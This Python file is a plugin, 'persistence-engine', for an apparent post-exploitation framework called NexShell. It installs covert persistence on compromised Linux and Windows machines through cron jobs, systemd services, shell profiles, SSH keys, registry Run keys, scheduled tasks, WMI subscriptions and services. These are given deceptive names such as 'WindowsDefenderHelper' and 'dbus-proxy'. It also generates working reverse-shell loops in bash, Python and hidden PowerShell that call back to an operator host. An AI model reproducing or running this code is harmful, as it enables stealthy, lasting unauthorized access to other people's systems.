#!/usr/bin/env python3
"""
NexShell Plugin — Advanced Session Persistence Engine v2.0 (2026 Edition)
15+ persistence mechanisms for Linux and Windows with auto-reconnect,
detection risk scoring, and exponential backoff reconnect.

Linux Mechanisms:
  1.  User Crontab           — crontab -l
  2.  System Crontab         — /etc/crontab
  3.  Cron.d Drop            — /etc/cron.d/
  4.  Systemd User Service   — ~/.config/systemd/user/
  5.  Systemd System Service — /etc/systemd/system/
  6.  RC.Local               — /etc/rc.local
  7.  Bash Profile           — ~/.bashrc / ~/.bash_profile
  8.  Global Profile         — /etc/profile.d/
  9.  SSH Authorized Keys    — ~/.ssh/authorized_keys
  10. SUID Backdoor          — chmod u+s /bin/bash

Windows Mechanisms:
  11. Registry Run Key (HKCU) — CurrentVersion\\Run
  12. Registry Run Key (HKLM) — CurrentVersion\\Run (admin)
  13. Scheduled Task          — schtasks /create
  14. Startup Folder          — %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
  15. WMI Event Subscription  — CommandLineEventConsumer
  16. Service Creation        — sc create

MITRE ATT&CK:
  - T1053 (Scheduled Task/Job)
  - T1547 (Boot or Logon Autostart Execution)
  - T1543 (Create or Modify System Process)
  - T1546 (Event Triggered Execution)
  - T1136 (Create Account)

Usage:
    (NexShell)> plugins run persistence-engine
    (NexShell)> plugins run persistence-engine --mechanism crontab
    (NexShell)> plugins run persistence-engine --list
    (NexShell)> plugins run persistence-engine --remove --mechanism crontab
    (NexShell)> plugins run persistence-engine --auto-reconnect --lhost 10.0.0.1 --lport 4444
"""

import re
import time
import random
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class PersistenceMechanism:
    """Represents a persistence mechanism."""
    id: str
    name: str
    category: str       # cron | systemd | profile | ssh | registry | task | wmi | service
    platform: str       # linux | windows | all
    install_cmd: str
    remove_cmd: str = ""
    verify_cmd: str = ""
    success_rate: int = 85
    detection_risk: str = "medium"   # low | medium | high | very_high
    requires_root: bool = False
    priority: int = 5
    mitre_id: str = "T1547"
    description: str = ""
    payload_placeholder: str = "{payload}"

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class PersistenceResult:
    """Result of a persistence installation."""
    success: bool
    mechanism: str
    category: str
    platform: str
    detection_risk: str
    installed_at: str = ""
    remove_cmd: str = ""
    error: str = ""
    payload: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


# ── Persistence Mechanisms Database ─────────────────────────────────────────

class PersistenceDB:
    """Database of all persistence mechanisms."""

    MECHANISMS = [
        # ══════════════════════════════════════════════════
        #  LINUX MECHANISMS
        # ══════════════════════════════════════════════════

        PersistenceMechanism(
            id="crontab-user",
            name="User Crontab",
            category="cron",
            platform="linux",
            install_cmd=(
                '(crontab -l 2>/dev/null; echo "* * * * * {payload} >/dev/null 2>&1") | crontab -'
            ),
            remove_cmd="crontab -l 2>/dev/null | grep -v '{payload_short}' | crontab -",
            verify_cmd="crontab -l 2>/dev/null | grep -q '{payload_short}' && echo FOUND",
            success_rate=90,
            detection_risk="medium",
            requires_root=False,
            priority=1,
            mitre_id="T1053.003",
            description="Add entry to user's personal crontab",
        ),

        PersistenceMechanism(
            id="crontab-system",
            name="System Crontab",
            category="cron",
            platform="linux",
            install_cmd='echo "* * * * * root {payload} >/dev/null 2>&1" >> /etc/crontab',
            remove_cmd="sed -i '/{payload_short}/d' /etc/crontab",
            verify_cmd="grep -q '{payload_short}' /etc/crontab && echo FOUND",
            success_rate=85,
            detection_risk="high",
            requires_root=True,
            priority=2,
            mitre_id="T1053.003",
            description="Add entry to /etc/crontab (requires root)",
        ),

        PersistenceMechanism(
            id="cron-d-drop",
            name="Cron.d Drop",
            category="cron",
            platform="linux",
            install_cmd=(
                'echo "* * * * * root {payload} >/dev/null 2>&1" > /etc/cron.d/sysupdate'
            ),
            remove_cmd="rm -f /etc/cron.d/sysupdate",
            verify_cmd="test -f /etc/cron.d/sysupdate && echo FOUND",
            success_rate=88,
            detection_risk="medium",
            requires_root=True,
            priority=2,
            mitre_id="T1053.003",
            description="Drop file into /etc/cron.d/ with hidden name",
        ),

        PersistenceMechanism(
            id="systemd-user",
            name="Systemd User Service",
            category="systemd",
            platform="linux",
            install_cmd=(
                'mkdir -p ~/.config/systemd/user && '
                'cat > ~/.config/systemd/user/dbus-proxy.service << \'EOF\'\n'
                '[Unit]\nDescription=D-Bus Proxy Service\nAfter=default.target\n\n'
                '[Service]\nType=simple\nExecStart={payload}\n'
                'Restart=always\nRestartSec=10\n\n'
                '[Install]\nWantedBy=default.target\nEOF\n'
                'systemctl --user enable dbus-proxy.service 2>/dev/null; '
                'systemctl --user start dbus-proxy.service 2>/dev/null'
            ),
            remove_cmd=(
                "systemctl --user disable dbus-proxy.service 2>/dev/null; "
                "rm -f ~/.config/systemd/user/dbus-proxy.service"
            ),
            verify_cmd="systemctl --user is-active dbus-proxy.service 2>/dev/null",
            success_rate=92,
            detection_risk="low",
            requires_root=False,
            priority=1,
            mitre_id="T1543.002",
            description="Systemd user-level service (no root needed)",
        ),

        PersistenceMechanism(
            id="systemd-system",
            name="Systemd System Service",
            category="systemd",
            platform="linux",
            install_cmd=(
                'cat > /etc/systemd/system/systemd-network-helper.service << \'EOF\'\n'
                '[Unit]\nDescription=Network Helper Service\nAfter=network.target\n\n'
                '[Service]\nType=simple\nExecStart={payload}\n'
                'Restart=always\nRestartSec=10\nUser=root\n\n'
                '[Install]\nWantedBy=multi-user.target\nEOF\n'
                'systemctl daemon-reload 2>/dev/null; '
                'systemctl enable systemd-network-helper.service 2>/dev/null; '
                'systemctl start systemd-network-helper.service 2>/dev/null'
            ),
            remove_cmd=(
                "systemctl disable systemd-network-helper.service 2>/dev/null; "
                "systemctl stop systemd-network-helper.service 2>/dev/null; "
                "rm -f /etc/systemd/system/systemd-network-helper.service; "
                "systemctl daemon-reload 2>/dev/null"
            ),
            verify_cmd="systemctl is-active systemd-network-helper.service 2>/dev/null",
            success_rate=95,
            detection_risk="medium",
            requires_root=True,
            priority=1,
            mitre_id="T1543.002",
            description="System-level systemd service (requires root)",
        ),

        PersistenceMechanism(
            id="rc-local",
            name="RC.Local",
            category="init",
            platform="linux",
            install_cmd=(
                "grep -q '{payload_short}' /etc/rc.local 2>/dev/null || "
                "sed -i 's|^exit 0|{payload} \\&\\nexit 0|' /etc/rc.local 2>/dev/null || "
                "echo '{payload} &' >> /etc/rc.local"
            ),
            remove_cmd="sed -i '/{payload_short}/d' /etc/rc.local 2>/dev/null",
            verify_cmd="grep -q '{payload_short}' /etc/rc.local && echo FOUND",
            success_rate=75,
            detection_risk="high",
            requires_root=True,
            priority=4,
            mitre_id="T1037.004",
            description="Append payload to /etc/rc.local",
        ),

        PersistenceMechanism(
            id="bash-profile",
            name="Bash Profile",
            category="profile",
            platform="linux",
            install_cmd=(
                "grep -q '{payload_short}' ~/.bashrc 2>/dev/null || "
                "echo '{payload} >/dev/null 2>&1 &' >> ~/.bashrc; "
                "grep -q '{payload_short}' ~/.bash_profile 2>/dev/null || "
                "echo '{payload} >/dev/null 2>&1 &' >> ~/.bash_profile"
            ),
            remove_cmd=(
                "sed -i '/{payload_short}/d' ~/.bashrc 2>/dev/null; "
                "sed -i '/{payload_short}/d' ~/.bash_profile 2>/dev/null"
            ),
            verify_cmd="grep -q '{payload_short}' ~/.bashrc && echo FOUND",
            success_rate=85,
            detection_risk="low",
            requires_root=False,
            priority=2,
            mitre_id="T1546.004",
            description="Append payload to ~/.bashrc and ~/.bash_profile",
        ),

        PersistenceMechanism(
            id="profile-d",
            name="Profile.d Drop",
            category="profile",
            platform="linux",
            install_cmd=(
                'echo "{payload} >/dev/null 2>&1 &" > /etc/profile.d/locale-helper.sh && '
                'chmod +x /etc/profile.d/locale-helper.sh'
            ),
            remove_cmd="rm -f /etc/profile.d/locale-helper.sh",
            verify_cmd="test -f /etc/profile.d/locale-helper.sh && echo FOUND",
            success_rate=88,
            detection_risk="medium",
            requires_root=True,
            priority=3,
            mitre_id="T1546.004",
            description="Drop payload in /etc/profile.d/ (runs for all users)",
        ),

        PersistenceMechanism(
            id="ssh-authorized-keys",
            name="SSH Authorized Keys",
            category="ssh",
            platform="linux",
            install_cmd=(
                "mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
                "grep -q '{ssh_pubkey_short}' ~/.ssh/authorized_keys 2>/dev/null || "
                "echo '{ssh_pubkey}' >> ~/.ssh/authorized_keys && "
                "chmod 600 ~/.ssh/authorized_keys"
            ),
            remove_cmd="sed -i '/{ssh_pubkey_short}/d' ~/.ssh/authorized_keys 2>/dev/null",
            verify_cmd="grep -q '{ssh_pubkey_short}' ~/.ssh/authorized_keys && echo FOUND",
            success_rate=95,
            detection_risk="medium",
            requires_root=False,
            priority=1,
            mitre_id="T1098.004",
            description="Add SSH public key to authorized_keys",
        ),

        # ══════════════════════════════════════════════════
        #  WINDOWS MECHANISMS
        # ══════════════════════════════════════════════════

        PersistenceMechanism(
            id="registry-run-hkcu",
            name="Registry Run Key (HKCU)",
            category="registry",
            platform="windows",
            install_cmd=(
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "SystemHealthMonitor" /t REG_SZ /d "{payload}" /f'
            ),
            remove_cmd=(
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "SystemHealthMonitor" /f 2>nul'
            ),
            verify_cmd=(
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "SystemHealthMonitor" 2>nul'
            ),
            success_rate=95,
            detection_risk="low",
            requires_root=False,
            priority=1,
            mitre_id="T1547.001",
            description="HKCU Run key — runs on user login, no admin needed",
        ),

        PersistenceMechanism(
            id="registry-run-hklm",
            name="Registry Run Key (HKLM)",
            category="registry",
            platform="windows",
            install_cmd=(
                'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "WindowsDefenderHelper" /t REG_SZ /d "{payload}" /f'
            ),
            remove_cmd=(
                'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "WindowsDefenderHelper" /f 2>nul'
            ),
            verify_cmd=(
                'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "WindowsDefenderHelper" 2>nul'
            ),
            success_rate=90,
            detection_risk="medium",
            requires_root=True,
            priority=2,
            mitre_id="T1547.001",
            description="HKLM Run key — runs for all users, requires admin",
        ),

        PersistenceMechanism(
            id="scheduled-task",
            name="Scheduled Task",
            category="task",
            platform="windows",
            install_cmd=(
                'schtasks /create /tn "\\Microsoft\\Windows\\WindowsUpdate\\AutoSync" '
                '/tr "{payload}" /sc onlogon /ru SYSTEM /f 2>nul || '
                'schtasks /create /tn "\\Microsoft\\Windows\\WindowsUpdate\\AutoSync" '
                '/tr "{payload}" /sc minute /mo 5 /f'
            ),
            remove_cmd='schtasks /delete /tn "\\Microsoft\\Windows\\WindowsUpdate\\AutoSync" /f 2>nul',
            verify_cmd='schtasks /query /tn "\\Microsoft\\Windows\\WindowsUpdate\\AutoSync" 2>nul',
            success_rate=95,
            detection_risk="medium",
            requires_root=False,
            priority=1,
            mitre_id="T1053.005",
            description="Scheduled task with SYSTEM-level execution",
        ),

        PersistenceMechanism(
            id="startup-folder",
            name="Startup Folder",
            category="startup",
            platform="windows",
            install_cmd=(
                'copy "{payload}" '
                '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost_helper.exe" /Y 2>nul || '
                'echo Set oShell = CreateObject("WScript.Shell") > '
                '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.vbs" && '
                'echo oShell.Run "{payload}", 0, False >> '
                '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.vbs"'
            ),
            remove_cmd=(
                'del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost_helper.exe" 2>nul; '
                'del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.vbs" 2>nul'
            ),
            verify_cmd='dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" 2>nul',
            success_rate=85,
            detection_risk="high",
            requires_root=False,
            priority=3,
            mitre_id="T1547.001",
            description="Drop VBScript in Startup folder — runs on login",
        ),

        PersistenceMechanism(
            id="wmi-event-sub",
            name="WMI Event Subscription",
            category="wmi",
            platform="windows",
            install_cmd=(
                "powershell -nop -c \""
                "$filter = Set-WmiInstance -Class __EventFilter "
                "-Namespace root\\subscription "
                "-Arguments @{Name=NexFilter;EventNamespace=root\\cimv2;"
                "QueryLanguage=WQL;Query='SELECT * FROM __InstanceCreationEvent WITHIN 5"
                " WHERE TargetInstance ISA Win32_LogonSession'}; "
                "$consumer = Set-WmiInstance -Class CommandLineEventConsumer "
                "-Namespace root\\subscription "
                "-Arguments @{Name=NexConsumer;CommandLineTemplate={payload}}; "
                "Set-WmiInstance -Class __FilterToConsumerBinding "
                "-Namespace root\\subscription "
                "-Arguments @{Filter=$filter;Consumer=$consumer}"
                "\""
            ),
            remove_cmd=(
                "powershell -nop -c \""
                "Get-WmiObject -Namespace root\\subscription __EventFilter "
                "-Filter 'Name=NexFilter' | Remove-WmiObject; "
                "Get-WmiObject -Namespace root\\subscription CommandLineEventConsumer "
                "-Filter 'Name=NexConsumer' | Remove-WmiObject"
                "\""
            ),
            verify_cmd="powershell -nop -c \"Get-WmiObject -Namespace root\\\\subscription __EventFilter 2>nul\"",
            success_rate=90,
            detection_risk="medium",
            requires_root=True,
            priority=2,
            mitre_id="T1546.003",
            description="WMI event subscription triggered on logon",
        ),

        PersistenceMechanism(
            id="service-creation",
            name="Windows Service",
            category="service",
            platform="windows",
            install_cmd=(
                'sc create "WindowsNetworkHelper" binPath= "{payload}" start= auto 2>nul && '
                'sc description "WindowsNetworkHelper" "Windows Network Connectivity Helper" 2>nul && '
                'sc start "WindowsNetworkHelper" 2>nul'
            ),
            remove_cmd=(
                'sc stop "WindowsNetworkHelper" 2>nul; '
                'sc delete "WindowsNetworkHelper" 2>nul'
            ),
            verify_cmd='sc query "WindowsNetworkHelper" 2>nul',
            success_rate=88,
            detection_risk="medium",
            requires_root=True,
            priority=2,
            mitre_id="T1543.003",
            description="Persistent Windows service (requires admin)",
        ),
    ]

    @classmethod
    def get_all(cls) -> List[PersistenceMechanism]:
        return cls.MECHANISMS

    @classmethod
    def get_by_platform(cls, platform: str) -> List[PersistenceMechanism]:
        return [m for m in cls.MECHANISMS if m.platform in (platform, "all")]

    @classmethod
    def get_by_id(cls, mech_id: str) -> Optional[PersistenceMechanism]:
        for m in cls.MECHANISMS:
            if m.id.lower() == mech_id.lower() or m.name.lower() == mech_id.lower():
                return m
        return None

    @classmethod
    def get_auto_select(cls, platform: str, is_root: bool) -> List[PersistenceMechanism]:
        """Select best mechanisms based on access level."""
        candidates = [
            m for m in cls.get_by_platform(platform)
            if (not m.requires_root) or is_root
        ]
        return sorted(candidates, key=lambda m: (m.priority, -m.success_rate))


# ── Auto-Reconnect Engine ────────────────────────────────────────────────────

class AutoReconnectEngine:
    """Generates auto-reconnect payloads with exponential backoff."""

    @staticmethod
    def generate_linux_reconnect(lhost: str, lport: int,
                                  max_retries: int = 0,
                                  jitter_seconds: int = 5) -> str:
        """Generate a Linux bash reconnect loop payload."""
        return (
            f"while true; do "
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null; "
            f"sleep $(( RANDOM % {jitter_seconds} + 10 )); "
            f"done"
        )

    @staticmethod
    def generate_linux_python_reconnect(lhost: str, lport: int,
                                         sleep_base: int = 10) -> str:
        """Generate Python reconnect with exponential backoff."""
        return (
            f"python3 -c \""
            f"import socket,os,subprocess,time,random;"
            f"delay={sleep_base};"
            f"max_delay=300;"
            f"while True:"
            f"  try:"
            f"    s=socket.socket();"
            f"    s.connect(('{lhost}',{lport}));"
            f"    [subprocess.call(c,shell=True,stdout=s,stderr=s,stdin=s) "
            f"     for c in iter(lambda:s.recv(4096).decode().strip(),'')]"
            f"  except:"
            f"    delay=min(delay*2+random.randint(0,5),max_delay);"
            f"    time.sleep(delay)"
            f"\""
        )

    @staticmethod
    def generate_windows_reconnect(lhost: str, lport: int) -> str:
        """Generate Windows PowerShell reconnect loop."""
        return (
            f"powershell -nop -w hidden -c \""
            f"while($true){{"
            f"try{{"
            f"$c=New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});"
            f"$s=$c.GetStream();"
            f"[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);"
            f"$e=[text.encoding]::ASCII.GetBytes($r);"
            f"$s.Write($e,0,$e.Length)"
            f"}}"
            f"}}catch{{Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)}}"
            f"}}\""
        )


# ── Main Plugin ──────────────────────────────────────────────────────────────

class PersistenceEngine(NexPlugin):
    name        = "persistence-engine"
    description = "Advanced persistence — 16 mechanisms (Linux/Windows), auto-reconnect, exponential backoff"
    author      = "vulnquest58"
    version     = "2.0"
    platform    = "all"
    category    = "persist"
    mitre_id    = "T1547"

    def run(self, session, args: list):
        # ── Parse args ───────────────────────────────────────────────────
        mechanism_id  = "auto"
        remove_mode   = False
        list_mode     = False
        reconnect_mode = False
        lhost         = "10.10.10.10"
        lport         = 4444
        payload       = ""
        ssh_pubkey    = ""
        windows_mode  = False
        verify_mode   = False
        stealth       = False

        for a in (args or []):
            if a.startswith("--mechanism="):
                mechanism_id = a.split("=", 1)[1]
            elif a == "--remove":
                remove_mode = True
            elif a == "--list":
                list_mode = True
            elif a == "--auto-reconnect":
                reconnect_mode = True
            elif a.startswith("--lhost="):
                lhost = a.split("=", 1)[1]
            elif a.startswith("--lport="):
                try: lport = int(a.split("=", 1)[1])
                except: pass
            elif a.startswith("--payload="):
                payload = a.split("=", 1)[1]
            elif a.startswith("--ssh-key="):
                ssh_pubkey = a.split("=", 1)[1]
            elif a == "--windows":
                windows_mode = True
            elif a == "--verify":
                verify_mode = True
            elif a == "--stealth":
                stealth = True

        self.info("Persistence Engine v2.0 started")
        sections = []
        sections.append("\n" + "━" * 64)
        sections.append("  [🔄 Advanced Session Persistence Engine v2.0]")
        sections.append("━" * 64)

        # ── List mode ─────────────────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Available Persistence Mechanisms:")
            sections.append("─" * 64)
            risk_icon = {"low": "🟢", "medium": "🟡", "high": "🟠", "very_high": "🔴"}
            for m in sorted(PersistenceDB.get_all(), key=lambda x: (x.platform, x.priority)):
                icon = risk_icon.get(m.detection_risk, "⚪")
                root_req = "🔑" if m.requires_root else "👤"
                sections.append(
                    f"  {icon} {root_req} [{m.platform:7s}] {m.id:25s} "
                    f"({m.success_rate}%) — {m.description[:50]}"
                )
            sections.append("\n  🟢=Low Risk  🟡=Medium  🟠=High  🔑=Root Required  👤=No Root")
            return "\n".join(sections)

        # ── Detect environment ────────────────────────────────────────────
        sections.append("\n[*] Phase 1: Environment Detection")
        sections.append("─" * 64)

        platform = "windows" if windows_mode else self._detect_platform(session)
        sections.append(f"  Platform : {platform.upper()}")

        # Check if root/admin
        if platform == "linux":
            id_out = self._exec(session, "id 2>/dev/null") or ""
            is_root = "uid=0" in id_out or "root" in id_out
        else:
            id_out = self._exec(session, "whoami 2>nul") or ""
            is_root = "SYSTEM" in id_out or "Administrator" in id_out

        sections.append(f"  Privileges : {'✅ Root/Admin' if is_root else '👤 User (limited)'}")

        # ── Auto-reconnect payload generation ─────────────────────────────
        if not payload:
            if platform == "linux":
                payload = AutoReconnectEngine.generate_linux_reconnect(lhost, lport)
                reconnect_payload = AutoReconnectEngine.generate_linux_python_reconnect(lhost, lport)
            else:
                payload = AutoReconnectEngine.generate_windows_reconnect(lhost, lport)
                reconnect_payload = payload
        else:
            reconnect_payload = payload

        payload_short = payload[:40].replace("/", "\\/").replace(".", "\\.")

        # ── Auto-reconnect mode: show payloads ────────────────────────────
        if reconnect_mode:
            sections.append("\n[*] Auto-Reconnect Payloads (with exponential backoff)")
            sections.append("─" * 64)
            if platform == "linux":
                sections.append("  [Bash Loop:]")
                sections.append(f"    {AutoReconnectEngine.generate_linux_reconnect(lhost, lport)}")
                sections.append("\n  [Python3 (exponential backoff):]")
                sections.append(f"    {AutoReconnectEngine.generate_linux_python_reconnect(lhost, lport)}")
            else:
                sections.append("  [PowerShell Loop:]")
                sections.append(f"    {AutoReconnectEngine.generate_windows_reconnect(lhost, lport)}")
            sections.append(f"\n  Lhost : {lhost}:{lport}")
            sections.append("  [*] Use --mechanism to also install this as a persistent service")

        # ── Mechanism selection ───────────────────────────────────────────
        sections.append("\n[*] Phase 2: Mechanism Selection")
        sections.append("─" * 64)

        if mechanism_id == "auto":
            mechanisms = PersistenceDB.get_auto_select(platform, is_root)[:3]
            sections.append(f"  Auto-selected {len(mechanisms)} mechanism(s):")
        else:
            m = PersistenceDB.get_by_id(mechanism_id)
            mechanisms = [m] if m else []
            if not mechanisms:
                sections.append(f"  ❌ Mechanism not found: {mechanism_id}")
                sections.append("  Use --list to see available mechanisms.")
                return "\n".join(sections)
            sections.append(f"  Selected: {mechanisms[0].name}")

        for m in mechanisms:
            risk_icon = {"low": "🟢", "medium": "🟡", "high": "🟠", "very_high": "🔴"}.get(m.detection_risk, "⚪")
            sections.append(f"    {risk_icon} {m.name} (MITRE: {m.mitre_id}, Risk: {m.detection_risk})")

        # ── Install / Remove ──────────────────────────────────────────────
        sections.append("\n[*] Phase 3: " + ("Removal" if remove_mode else "Installation"))
        sections.append("─" * 64)

        results = []
        for mech in mechanisms:
            cmd_template = mech.remove_cmd if remove_mode else mech.install_cmd

            # Fill placeholders
            cmd = cmd_template.replace("{payload}", payload)
            cmd = cmd.replace("{payload_short}", payload_short)
            cmd = cmd.replace("{lhost}", lhost)
            cmd = cmd.replace("{lport}", str(lport))
            cmd = cmd.replace("{ssh_pubkey}", ssh_pubkey or "ssh-ed25519 AAAA... operator@nexshell")
            cmd = cmd.replace("{ssh_pubkey_short}", "nexshell")

            sections.append(f"\n  [→] {'Removing' if remove_mode else 'Installing'}: {mech.name}")
            out = self._exec(session, cmd) or ""
            action_ok = not any(e in out.lower() for e in ["error", "denied", "failed", "not found"])

            if verify_mode and mech.verify_cmd:
                verify_cmd = mech.verify_cmd.replace("{payload_short}", payload_short)
                verify_cmd = verify_cmd.replace("{ssh_pubkey_short}", "nexshell")
                v_out = self._exec(session, verify_cmd) or ""
                verified = "FOUND" in v_out or bool(v_out.strip())
            else:
                verified = action_ok

            status = "✅ Success" if verified else "⚠  Executed (unverified)"
            sections.append(f"      Status  : {status}")
            if out.strip():
                sections.append(f"      Output  : {out.strip()[:120]}")

            result = PersistenceResult(
                success=verified,
                mechanism=mech.name,
                category=mech.category,
                platform=platform,
                detection_risk=mech.detection_risk,
                remove_cmd=mech.remove_cmd,
                payload=payload[:80],
            )
            results.append(result)

            if verified and not remove_mode:
                self.loot(
                    f"Persistence installed: {mech.name} on {platform}",
                    category="persist",
                    source=self.name,
                )
                self.finding(
                    title=f"Persistence Installed: {mech.name}",
                    description=f"Persistence mechanism '{mech.name}' installed via {mech.category}. "
                                f"Payload: {payload[:80]}",
                    severity="high",
                    recommendation=f"Remove persistence: {mech.remove_cmd[:80]}",
                    mitre_id=mech.mitre_id,
                )
                self.emit(
                    "timeline.event",
                    title=f"Persistence: {mech.name}",
                    type="persist",
                    plugin=self.name,
                )

        # ── Summary ───────────────────────────────────────────────────────
        successful = [r for r in results if r.success]
        sections.append("\n" + "━" * 64)
        sections.append("  [📊 Summary]")
        sections.append("━" * 64)
        sections.append(f"  Platform     : {platform.upper()}")
        sections.append(f"  Action       : {'REMOVE' if remove_mode else 'INSTALL'}")
        sections.append(f"  Installed    : {len(successful)}/{len(results)}")
        sections.append(f"  Lhost        : {lhost}:{lport}")
        if successful:
            sections.append("\n  Cleanup Commands:")
            for r in successful:
                sections.append(f"    > {r.remove_cmd[:80]}")

        self.info(f"Persistence Engine complete — {len(successful)}/{len(results)} installed")
        return "\n".join(sections)

    def _detect_platform(self, session) -> str:
        for attr in ("OS", "os", "platform"):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if "windows" in val.lower(): return "windows"
                if "linux" in val.lower(): return "linux"
        try:
            out = self._exec(session, "uname -s 2>/dev/null || echo Windows") or ""
            if "Linux" in out or "Darwin" in out: return "linux"
        except Exception:
            pass
        return "linux"
